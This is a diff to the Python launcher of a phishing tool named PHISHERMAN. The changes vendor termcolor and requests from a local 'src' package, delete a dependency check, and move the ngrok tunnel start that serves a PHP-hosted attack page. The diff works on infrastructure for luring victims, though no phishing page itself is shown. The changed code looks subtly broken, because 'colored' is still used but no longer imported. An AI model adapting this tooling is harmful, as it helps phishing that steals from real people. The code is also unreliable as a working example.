@@ -1,6 +1,7 @@
 #!/Library/Frameworks/Python.framework/Versions/3.8/bin/python3
 import subprocess
 from sys import exit
+from src import termcolor
 import platform
 from zipfile import ZipFile
 from os import walk,path,getcwd
@@ -8,22 +9,8 @@ from time import sleep
 import threading
 from datetime import datetime
 import json
+from src import requests
 
-j=[]
-try:
-    from termcolor import colored
-except:
-    j.append('termcolor')
-try:
-    import requests
-except:
-    j.append('requests')
-if j:
-    print('PLEASE INSTALL THE FOLLOWING MODULES\n')
-    for a in j:
-        print(a)
-    print('\nPLEASE RUN pip3 install -r requirements.txt BEFORE STARTING PHISHERMAN')
-    exit()
     
 try:
     subprocess.check_output('php -v > /dev/null 2>&1',shell=True)
@@ -64,7 +51,6 @@ def start_php(server):
 
 def attack(server,url,wifi):
         
-    ngrok()
     t1 = threading.Thread(target=start_ngrok)
     t2 = threading.Thread(target=start_php,args=[server])
     t1.setDaemon = True
@@ -163,6 +149,7 @@ def ip_details(ip):
     
 
 def main():    
+    
     ngrok()
     s1 = colored('''
 
